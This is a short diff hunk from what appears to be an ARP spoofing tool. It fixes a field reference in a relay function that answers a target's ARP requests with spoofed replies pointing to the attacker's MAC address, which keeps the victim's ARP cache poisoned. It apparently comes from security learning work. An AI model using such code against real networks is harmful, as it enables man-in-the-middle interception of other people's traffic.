@@ -117,7 +117,7 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
         for (int i = 0; i < count; i++)
         {
 
-            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, targets[i].target_mac)) && (if_same_ip(pkt->arp_.tip, targets[i].target_mac.sender_ip)))
+            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, targets[i].target_mac)) && (if_same_ip(pkt->arp_.tip, targets[i].sender_ip)))
             {
                 printf("where is sender?\n");
                 request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
